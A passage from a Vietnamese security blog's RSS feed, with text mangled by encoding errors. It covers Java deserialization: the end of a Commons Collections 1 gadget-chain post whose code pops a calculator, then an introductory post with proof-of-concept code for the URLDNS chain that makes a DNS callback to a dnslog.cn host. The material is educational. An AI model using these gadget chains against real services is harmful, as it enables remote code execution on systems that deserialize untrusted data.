     <span class="type">Class</span> <span class="variable">aihClass</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line">        <span class="type">Constructor</span> <span class="variable">aihClassConstructor</span> <span class="operator">=</span> aihClass.getDeclaredConstructor(Class.class, Map.class);</span><br><span class="line">        aihClassConstructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">aihObject</span> <span class="operator">=</span> aihClassConstructor.newInstance(Target.class, map);</span><br><span class="line">        serialize(aihObject);</span><br><span class="line">        unserialize(<span class="string">&quot;ser.bin&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Cháº¡y file vÃ  mÃ¡y tÃ­nh Ä‘Ã£ báº­t lÃªnâ€¦</p><h2 id="Loi-ket"><a href="#Loi-ket" class="headerlink" title="Lá»i káº¿t"></a>Lá»i káº¿t</h2><p>VÃ  Ä‘áº¿n Ä‘Ã¢y lÃ  mÃ¬nh Ä‘Ã£ hoÃ n thÃ nh chain <em>Commons Collections 1</em> theo hÆ°á»›ng TransformedMap, lÃ  chain Ä‘áº§u tiÃªn mÃ¬nh lÃ m vÃ  bÆ°á»›c chÃ¢n vÃ o con Ä‘Æ°á»ng Java Security.<br>Tháº­t sá»±, khi Ä‘á»c mÃ£ nguá»“n tá»« nhÃ  phÃ¡t hÃ nh vÃ  tÃ¬m hiá»ƒu cÃ¡ch cÃ¡c master OOP sá»­ dá»¥ng cÃ¡c thÆ° viá»‡n, mÃ¬nh nháº­n tháº¥y ráº¥t nhiá»u kiáº¿n thá»©c mÃ¬nh chÆ°a cÃ³. Tuy nhiÃªn, nhá» Ä‘Ã³, mÃ¬nh Ä‘Ã£ há»c Ä‘Æ°á»£c nhiá»u kiáº¿n thá»©c má»›i vá» Java OOP.<br>Hy vá»ng cÃ¡c báº¡n nÃ o má»›i bÆ°á»›c chÃ¢n vÃ o Java Security nhÆ° mÃ¬nh hÃ£y cá»‘ gáº¯ng nghiÃªn cá»©u, Ä‘á»c hiá»ƒu tá»« tá»« Ä‘á»ƒ cÃ³ thá»ƒ hiá»ƒu má»™t cÃ¡ch rÃµ nháº¥t vá» cÃ¡i Ä‘áº¹p cá»§a Java OOP. Thá»±c sá»± ráº¥t khÃ³ cho ngÆ°á»i má»›i há»c nÃªn hy vá»ng cÃ¡c báº¡n cÃ³ thá»ƒ vÆ°á»£t qua ^^.</p><blockquote><p>ChÃºc cÃ¡c báº¡n há»c tá»‘t~</p></blockquote>]]></content:encoded>
      
      
      <category domain="https://rayinaw.github.io/categories/Java/">Java</category>
      
      <category domain="https://rayinaw.github.io/categories/Java/Deserialization/">Deserialization</category>
      
      
      <category domain="https://rayinaw.github.io/tags/Java/">Java</category>
      
      <category domain="https://rayinaw.github.io/tags/Deserialization/">Deserialization</category>
      
      <category domain="https://rayinaw.github.io/tags/Commons-Collections/">Commons Collections</category>
      
      
      <comments>https://rayinaw.github.io/2022/11/04/Commons-Collections1-TransformedMap/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>Introduction to Java Deserialization</title>
      <link>https://rayinaw.github.io/2022/11/03/JavaDeserializationBasic/</link>
      <guid>https://rayinaw.github.io/2022/11/03/JavaDeserializationBasic/</guid>
      <pubDate>Wed, 02 Nov 2022 19:50:28 GMT</pubDate>
      
        
        
      <description>&lt;p&gt;BÃ i viáº¿t nÃ y lÃ  vá» nhá»¯ng concept cÆ¡ báº£n cá»§a quÃ¡ trÃ¬nh Serialization vÃ  Deserialization vÃ  cÃ¡ch mÃ  lá»— há»•ng Java Deserialization Ä‘Æ°á»£c thá»±c </description>
        
      
      
      
      <content:encoded><![CDATA[<p>BÃ i viáº¿t nÃ y lÃ  vá» nhá»¯ng concept cÆ¡ báº£n cá»§a quÃ¡ trÃ¬nh Serialization vÃ  Deserialization vÃ  cÃ¡ch mÃ  lá»— há»•ng Java Deserialization Ä‘Æ°á»£c thá»±c thi.</p><h1 id="Serialization-va-Deserialization"><a href="#Serialization-va-Deserialization" class="headerlink" title="Serialization vÃ  Deserialization"></a>Serialization vÃ  Deserialization</h1><h2 id="1-Serialization-va-deserialization-la-gi"><a href="#1-Serialization-va-deserialization-la-gi" class="headerlink" title="1. Serialization vÃ  deserialization lÃ  gÃ¬?"></a>1. Serialization vÃ  deserialization lÃ  gÃ¬?</h2><p>Hiá»ƒu má»™t cÃ¡ch Ä‘Æ¡n giáº£n hai quÃ¡ trÃ¬nh nÃ y lÃ :</p><ul><li>Serialization: Object â€“&gt; string hay bytecode(vá»›i Java)</li><li>Deserialization: string hoáº·c bytecode â€“&gt; Object</li></ul><h2 id="2-Nhung-qua-trinh-can-su-dung-den-Serialization"><a href="#2-Nhung-qua-trinh-can-su-dung-den-Serialization" class="headerlink" title="2. Nhá»¯ng quÃ¡ trÃ¬nh cáº§n sá»­ dá»¥ng Ä‘áº¿n Serialization:"></a>2. Nhá»¯ng quÃ¡ trÃ¬nh cáº§n sá»­ dá»¥ng Ä‘áº¿n Serialization:</h2><p>LÆ°u cÃ¡c Ä‘á»‘i tÆ°á»£ng (á»Ÿ Ä‘Ã¢y xem nhÆ° dá»¯ liá»‡u) vÃ o bá»™ nhá»›, tá»‡p, cÆ¡ sá»Ÿ dá»¯ liá»‡u,â€¦<br>Truyá»n cÃ¡c Ä‘á»‘i tÆ°á»£ng qua máº¡ng.<br>Chuyá»ƒn Ä‘á»‘i tÆ°á»£ng qua RMI.</p><h2 id="3-Trien-khai-qua-trinh-Ser-va-Deser-co-ban"><a href="#3-Trien-khai-qua-trinh-Ser-va-Deser-co-ban" class="headerlink" title="3. Triá»ƒn khai quÃ¡ trÃ¬nh Ser vÃ  Deser cÆ¡ báº£n:"></a>3. Triá»ƒn khai quÃ¡ trÃ¬nh Ser vÃ  Deser cÆ¡ báº£n:</h2><p>á» Ä‘Ã¢y mÃ¬nh táº¡o má»™t package SerialBasic rá»“i cho cÃ¡c lá»›p vÃ o trong package Ä‘Ã³.</p><p>File Person.java</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">package</span> SerialBasic;</span><br><span class="line"><span class="keyword">import</span> java.io.Serializable;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Person</span> <span class="keyword">implements</span> <span class="title class_">Serializable</span>&#123;</span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span> age;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Person</span><span class="params">()</span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Person</span><span class="params">(String name, <span class="type">int</span> age)</span>&#123;</span><br><span class="line">        <span class="built_in">this</span>.name = name;</span><br><span class="line">        <span class="built_in">this</span>.age = age;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">toString</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Person&#123;name=&#x27;&quot;</span>+name+<span class="string">&quot;&#x27; age=&quot;</span>+age+<span class="string">&quot;&#125;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>File SerializationTest.java</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">package</span> SerialBasic;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.FileOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutput;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">SerializationTest</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serialize</span><span class="params">(Object obj)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;ser.txt&quot;</span>));</span><br><span class="line">        oos.writeObject(obj);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">Person</span> <span class="variable">person</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Person</span>(<span class="string">&quot;rayinaw&quot;</span>, <span class="number">16</span>);</span><br><span class="line">        serialize(person);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>File DeserializationTest.java</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">package</span> SerialBasic;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">DeserializationTest</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">deserialize</span><span class="params">(String FileName)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(FileName));</span><br><span class="line">        <span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> ois.readObject();</span><br><span class="line">        <span class="keyword">return</span> obj;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">        <span class="type">Person</span> <span class="variable">test</span> <span class="operator">=</span> (Person) deserialize(<span class="string">&quot;ser.txt&quot;</span>);</span><br><span class="line">        System.out.println(test);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Äáº§u tiÃªn ta cháº¡y file SerializationTest.java, sau khi cháº¡y xong ta tháº¥y á»Ÿ trong thÆ° má»¥c cha cá»§a src cÃ³ má»™t file ser.txt má»›i Ä‘Æ°á»£c táº¡o.<br>Tiáº¿p Ä‘áº¿n cháº¡y file DeserializationTest.java:</p><p><img src="https://raw.githubusercontent.com/rayinaw/rayinaw.github.io/main/images/post/IntroduceToDeser/JavaDeserializationBasicPic1.webp"></p><p>Giáº£i thÃ­ch:</p><ul><li>SerializationTest.java<br>Ban Ä‘áº§u chÃºng ta khá»Ÿi táº¡o má»™t object new FileOutputStream(â€œser.txtâ€), tiáº¿p Ä‘áº¿n chÃºng ta khá»Ÿi táº¡o má»™t ObjectOutputStream. Rá»“i thá»±c hiá»‡n oos.writeObject(obj) Ä‘á»ƒ viáº¿t Ä‘á»‘i tÆ°á»£ng vÃ o file ser.txt<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;ser.txt&quot;</span>));  </span><br><span class="line">oos.writeObject(obj);</span><br></pre></td></tr></table></figure></li><li>DeserializationTest.java<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(Filename));  </span><br><span class="line"><span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> ois.readObject();</span><br></pre></td></tr></table></figure></li></ul><h1 id="Cach-ma-lo-hong-Deserialization-xay-ra"><a href="#Cach-ma-lo-hong-Deserialization-xay-ra" class="headerlink" title="CÃ¡ch mÃ  lá»— há»•ng Deserialization xáº£y ra:"></a>CÃ¡ch mÃ  lá»— há»•ng Deserialization xáº£y ra:</h1><p>á» Ä‘Ã¢y mÃ¬nh dÃ¹ng Intellij Ä‘á»ƒ thá»±c hiá»‡n, má»™t IDEA ráº¥t tiá»‡n lá»£i mÃ  ai lÃ m viá»‡c vá»›i Java Ä‘á»u sá»­ dá»¥ng.<br>MÃ¬nh chá»‰ nÃ³i Ä‘áº¿n má»™t chuá»—i cÆ¡ báº£n Ä‘á»ƒ cÃ¡c báº¡n cÃ³ thá»ƒ hÃ¬nh dung cÃ¡ch thá»±c hiá»‡n vÃ  báº¯t Ä‘áº§u vá»›i Deserialization trong Java nhÃ© ^^.</p><h2 id="1-HashMap-va-cach-no-gay-ra-lo-hong-Deserialization"><a href="#1-HashMap-va-cach-no-gay-ra-lo-hong-Deserialization" class="headerlink" title="1. HashMap vÃ  cÃ¡ch nÃ³ gÃ¢y ra lá»— há»•ng Deserialization:"></a>1. HashMap vÃ  cÃ¡ch nÃ³ gÃ¢y ra lá»— há»•ng Deserialization:</h2><p>GÃµ <strong>Ctrl + N</strong> vÃ  tÃ¬m kiáº¿m lá»›p <strong>HashMap</strong>:</p><p><img src="https://raw.githubusercontent.com/rayinaw/rayinaw.github.io/main/images/post/IntroduceToDeser/JavaDeserializationBasicPic2.webp"></p><p>Lá»›p HashMap nÃ y cÃ³ implements lá»›p Serializable váº­y nÃªn chÃºng ta cÃ³ thá»ƒ dÃ¹ng nÃ³ Ä‘á»ƒ lá»£i dá»¥ng quÃ¡ trÃ¬nh Ser vÃ  Deser.</p><p>Tiáº¿p theo má»Ÿ pháº§n Structure vÃ  tÃ¬m kiáº¿n method <strong>readObject</strong> cá»§a lá»›p <strong>HashMap</strong>:</p><p><img src="https://raw.githubusercontent.com/rayinaw/rayinaw.github.io/main/images/post/IntroduceToDeser/JavaDeserializationBasicPic3.webp"></p><p>Trong method readObject ta tháº¥y cÃ³ pháº§n quan trá»ng á»Ÿ Ä‘Ã¢y:</p><ul><li>Äáº§u tiÃªn thá»±c hiá»‡n gÃ¡n key vÃ  value &#x3D; s.readObject()</li><li>Sau Ä‘Ã³ thá»±c hiá»‡n hÃ m putVal(), Ä‘iá»ƒm cáº§n chÃº Ã½ á»Ÿ Ä‘Ã¢y lÃ  nÃ³ Ä‘Æ°a key vÃ o method hash().<br><img src="https://raw.githubusercontent.com/rayinaw/rayinaw.github.io/main/images/post/IntroduceToDeser/putValinReadObject.png"></li></ul><p><code>Ctrl + Chuá»™t</code> trÃ¡i Ä‘á»ƒ Ä‘i vÃ o phÆ°Æ¡ng thá»©c hash():<br><img src="https://raw.githubusercontent.com/rayinaw/rayinaw.github.io/main/images/post/IntroduceToDeser/hash.png"><br>Trong phÆ°Æ¡ng thá»©c hash nÃ y, náº¿u key &#x3D;&#x3D; null sáº½ return 0, cÃ²n khÃ´ng thÃ¬ sáº½ thá»±c hiá»‡n <code>h = key.hashCode()) ^ (h &gt;&gt;&gt; 16)</code> rá»“i return h.<br>Äiá»ƒm mÃ  chÃºng ta cáº§n chÃº Ã½ á»Ÿ Ä‘Ã¢y lÃ  nÃ³ thá»±c hiá»‡n key.hashCode() mÃ¬nh sáº½ Ä‘i sÃ¢u má»™t chÃºt cho cÃ¡c báº¡n dá»… hiá»ƒu:</p><ul><li>Trong Java cÃ³ má»™t lá»›p lÃ  cha cá»§a má»i lá»›p Ä‘Ã³ lÃ  lá»›p Object, nÃ³ cÃ³ cÃ¡c phÆ°Æ¡ng thá»©c nhÆ° toString(), hashCode(),â€¦</li><li>key lÃ  má»™t object cá»§a lá»›p hashMap mÃ  implements ngáº§m lá»›p Object (vÃ¬ nÃ³ cha cá»§a má»i lá»›p mÃ ) váº­y nÃªn nÃ³ thá»«a hÆ°á»Ÿng cÃ¡c phÆ°Æ¡ng thá»©c cá»§a lá»›p Object. NÃªn á»Ÿ Ä‘Ã¢y chÃºng ta cÃ³ thá»ƒ gá»i key.hashCode()</li></ul><p>Viá»‡c gá»i hashCode() á»Ÿ Ä‘Ã¢y cÃ³ Ã½ nghÄ©a gÃ¬ thÃ¬ chÃºng ta cÃ¹ng Ä‘i sÃ¢u vÃ o chuá»•i URLDNS nhÃ©!</p><h2 id="2-Phan-tich-chuoi-URLDNS"><a href="#2-Phan-tich-chuoi-URLDNS" class="headerlink" title="2. PhÃ¢n tÃ­ch chuá»—i URLDNS:"></a>2. PhÃ¢n tÃ­ch chuá»—i URLDNS:</h2><p>Chuá»—i URLDNS lÃ  má»™t chuá»—i Ä‘Æ¡n giáº£n nháº¥t trong cÃ¡c gadget chain (Ä‘Æ°Æ¡ng nhiÃªn sáº½ hÆ¡i khÃ³ hiá»ƒu vá»›i ngÆ°á»i báº¯t Ä‘áº§u, keep going ^^). Chuá»—i nÃ y khÃ´ng thá»±c sá»± gÃ¢y ra má»™t váº¥n Ä‘á» gÃ¬ nghiÃªm trá»ng nhÆ° lÃ  RCE hay lÃ  SSRFâ€¦, káº¿t quáº£ cá»§a chuá»—i nÃ y lÃ  thá»±c hiá»‡n má»™t yÃªu cáº§u DNS Ä‘áº¿n Ä‘á»‹a chá»‰ mÃ  chÃºng ta Ä‘Æ°a vÃ o. NÃ³ cÃ³ káº¿t quáº£ pháº£i khÃ´ng nÃ o ^^, váº­y nÃªn chuá»—i nÃ y sáº½ giÃºp cÃ¡c báº¡n biáº¿t Ä‘Æ°á»£c má»™t gadget chain sáº½ xáº£y ra nhÆ° tháº¿ nÃ o. Cá»‘ gáº¯ng viáº¿t code, Ä‘á»c hiá»ƒu Ä‘á»ƒ nhanh tiáº¿n bá»™ nhÃ© Ù©(^â€¿^)Û¶â€¦</p><p>Chuá»—i thá»±c thi cá»§a URLDNS nhÆ° sau:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Gadget Chain:</span><br><span class="line">    HashMap.readObject()</span><br><span class="line">        HashMap.putVal()</span><br><span class="line">            HashMap.hash()</span><br><span class="line">                URL.hashCode()</span><br></pre></td></tr></table></figure><p>Äá»ƒ táº¡o má»™t HashMap, Ä‘áº§u tiÃªn chÃºng ta thá»±c hiá»‡n táº¡o má»™t object hashmap, sau Ä‘Ã³ chÃºng ta sáº½ thá»±c hiá»‡n hÃ m put() Ä‘á»ƒ Ä‘Æ°a dá»¯ liá»‡u vÃ o trong object HashMap Ä‘Ã³.</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line"></span><br><span class="line">        HashMap&lt;URL, Integer&gt; hashmap = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;URL, Integer&gt;();</span><br><span class="line">        hashmap.put(<span class="keyword">new</span> <span class="title class_">URL</span>(<span class="string">&quot;https://0tvykt.dnslog.cn&quot;</span>), <span class="number">1</span>);</span><br><span class="line">        serialize(hashmap);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>á» Ä‘Ã¢y tham sá»‘ Ä‘áº§u tiÃªn cá»§a hÃ m put() lÃ  má»™t object key, vÃ  tham sá»‘ thá»© hai lÃ  value. Hai biáº¿n nÃ y tÆ°Æ¡ng á»©ng vá»›i key vÃ  value mÃ¬nh Ä‘Ã£ phÃ¢n tÃ­ch á»Ÿ trÃªn pháº§n phÃ¢n tÃ­ch vá» HashMap. á» Ä‘Ã¢y vÃ¬ key nháº­n vÃ o lÃ  má»™t object nÃªn á»Ÿ Ä‘Ã¢y chÃºng ta sáº½ táº¡o má»™t object URL Ä‘á»ƒ thá»±c hiá»‡n chain nÃ y.<br>BÃ¢y giá», giáº£ sá»­ nhÆ° chÃºng ta thá»±c hiá»‡n readObject hashmap, nÃ³ sáº½ Ä‘i theo sÆ¡ Ä‘á»“:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Gadget Chain:</span><br><span class="line">    HashMap.readObject()</span><br><span class="line">        HashMap.putVal()</span><br><span class="line">            HashMap.hash()</span><br><span class="line">                URL.hashCode()</span><br></pre></td></tr></table></figure><p>VÃ  Ä‘áº¿n Ä‘Ã¢y, phÆ°Æ¡ng thá»©c hashCode() Ä‘Æ°á»£c gá»i sau khi readObject() sáº½ phÃ¡t huy tÃ¡c dá»¥ng. ChÃºng ta sáº½ Ä‘i sÃ¢u vÃ o pháº§n nÃ y:<br>Tiáº¿p tá»¥c chÃºng ta tÃ¬m class URL rá»“i tÃ¬m Ä‘áº¿n method hashCode().<br><img src="https://raw.githubusercontent.com/rayinaw/rayinaw.github.io/main/images/post/IntroduceToDeser/HashCodeOfURLObject.webp"></p><p>á» Ä‘Ã¢y, phÆ°Æ¡ng thá»©c <code>hashCode()</code> cá»§a lá»›p Object Ä‘Ã£ Ä‘Æ°á»£c Ä‘á»‹nh nghÄ©a láº¡i trong lá»›p URL:</p><ul><li>Náº¿u <code>hashCode</code> khÃ´ng báº±ng -1 thÃ¬ sáº½ thá»±c hiá»‡n <code>return hashCode</code> bá»Ÿi vÃ¬ nÃ³ Ä‘Ã£ Ä‘Æ°á»£c set rá»“i.</li><li>Náº¿u khÃ´ng thÃ¬ <code>hashCode</code> sáº½ Ä‘Æ°á»£c gÃ¡n báº±ng <code>handler.hashCode(this)</code>, this á»Ÿ Ä‘Ã¢y cÃ³ nghÄ©a lÃ  nÃ³ sáº½ láº¥y object cá»§a lá»›p hiá»‡n táº¡i Ä‘Æ°a vÃ o handler.hashCode rá»“i thá»±c hiá»‡n tiáº¿p.<br>Tiáº¿n hÃ nh <code>Ctrl+Chuá»™t trÃ¡i</code> rá»“i nháº¥n vÃ o handler Ä‘á»ƒ Ä‘i Ä‘áº¿n nÆ¡i mÃ  biáº¿n hanler Ä‘Æ°á»£c táº¡o.<br><code>áº¢nh biáº¿n handler</code><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">transient</span> URLStreamHandler handler;</span><br></pre></td></tr></table></figure>Biáº¿n handler á»Ÿ Ä‘Ã¢y lÃ  má»™t object cá»§a lá»›p <code>URLStreamHandler</code>, object nÃ y sáº½ gá»i Ä‘áº¿n phÆ°Æ¡ng thá»©c hashCode() Ä‘Æ°á»£c Ä‘á»‹nh nghÄ©a trong lá»›p nÃ y. Tiáº¿n hÃ nh <code>Ctrl+Chuá»™t trÃ¡i</code> rá»“i click vÃ o <code>URLStreamHandler</code>, rá»“i tÃ¬m Ä‘áº¿n phÆ°Æ¡ng thá»©c hashCode().</li></ul><p><img src="https://raw.githubusercontent.com/rayinaw/rayinaw.github.io/main/images/post/IntroduceToDeser/HashCodeOfURLStreamHandler.webp"></p><p>Trong phÆ°Æ¡ng thá»©c nÃ y chÃºng ta tháº¥y dÃ²ng <code>InetAddress addr = getHostAddress(u);</code> cÃ³ nghÄ©a lÃ  nÃ³ sáº½ thá»±c hiá»‡n má»™t yÃªu cáº§u DNS Ä‘áº¿n Ä‘á»‹a chá»‰ URL Ä‘á»ƒ thá»±c hiá»‡n getHostAddress. Äáº¿n Ä‘Ã¢y ta Ä‘áº¡t Ä‘Æ°á»£c má»¥c Ä‘Ã­ch cá»§a Chain nÃ y Ä‘Ã³ lÃ  request Ä‘áº¿n Ä‘á»‹a chá»‰ URL mÃ  ta cung cáº¥p. CÃ²n láº¡i pháº§n sau vÃ  viá»‡c nÃ³ thá»±c hiá»‡n request tháº¿ nÃ o thÃ¬ chÃºng ta khÃ´ng cáº§n quan tÃ¢m, chá»‰ váº­y lÃ  Ä‘Ã£ Ä‘á»§ (ÄÆ°Æ¡ng nhiÃªn báº¡n nÃ o thÃ­ch thÃ¬ cá»© tÃ¬m hiá»ƒu nhÃ© ^^).</p><h2 id="3-POC-cho-chuoi-URLDNS"><a href="#3-POC-cho-chuoi-URLDNS" class="headerlink" title="3. POC cho chuá»—i URLDNS:"></a>3. POC cho chuá»—i URLDNS:</h2><p>Link nháº­n DNS request: <a href="http://dnslog.cn/">http://dnslog.cn/</a></p><h3 id="Chu-y-khi-thuc-hien-serialize-object-cua-lop-HashMap"><a href="#Chu-y-khi-thuc-hien-serialize-object-cua-lop-HashMap" class="headerlink" title="ChÃº Ã½ khi thá»±c hiá»‡n serialize object cá»§a lá»›p HashMap:"></a>ChÃº Ã½ khi thá»±c hiá»‡n serialize object cá»§a lá»›p HashMap:</h3><p>Filename: SerializeTest.java</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> BasicChain;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.net.URL;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">SerializeTest</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serialize</span><span class="params">(Object obj)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;Ser2.txt&quot;</span>));</span><br><span class="line">        oos.writeObject(obj);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        HashMap&lt;URL, Integer&gt; hashmap = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;URL, Integer&gt;();</span><br><span class="line">        hashmap.put(<span class="keyword">new</span> <span class="title class_">URL</span>(<span class="string">&quot;https://0tvykt.dnslog.cn&quot;</span>), <span class="number">1</span>);</span><br><span class="line">        serialize(hashmap);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Sau khi cháº¡y file nÃ y, dÃ¹ chÆ°a thá»±c hiá»‡n deserialize file <code>Ser2.txt</code> mÃ  chÃºng ta Ä‘Ã£ nháº­n Ä‘Æ°á»£c request Ä‘áº¿n. NguyÃªn nhÃ¢n lÃ  do khi thá»±c hiá»‡n gÃ¡n giÃ¡ trá»‹ vÃ o object hashmap báº±ng hashmap.put(), hÃ m hash trong phÆ°Æ¡ng thá»©c nÃ y Ä‘Ã£ Ä‘Æ°á»£c thá»±c hiá»‡n vÃ  sáº½ request Ä‘áº¿n Ä‘á»‹a chá»‰ URL mÃ  ta cung cáº¥p.<br><img src="https://raw.githubusercontent.com/rayinaw/rayinaw.github.io/main/images/post/IntroduceToDeser/HashMapPutMethod.webp"><br>Sau khi request Ä‘áº¿n URL, biáº¿n hashcode bÃ¢y giá» Ä‘Ã£ khÃ´ng cÃ²n 